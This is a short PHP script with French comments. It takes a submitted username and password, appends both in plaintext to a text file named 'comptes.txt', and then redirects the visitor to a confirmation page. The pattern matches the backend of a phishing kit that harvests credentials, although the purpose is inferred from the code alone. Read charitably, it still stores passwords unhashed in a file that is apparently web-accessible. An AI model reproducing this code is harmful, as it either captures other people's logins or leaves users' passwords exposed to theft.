<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Ouvrir le fichier en mode écriture
    $file = fopen('comptes.txt', 'a');

    // Écrire les données dans le fichier
    fwrite($file, "Nom d'utilisateur : " . $username . "\n");
    fwrite($file, "Mot de passe : " . $password . "\n");
    fwrite($file, "------------------------\n");

    // Fermer le fichier
    fclose($file);

    // Rediriger l'utilisateur vers une page de confirmation
    header('Location: confirmation.html');
    exit;
}
?>
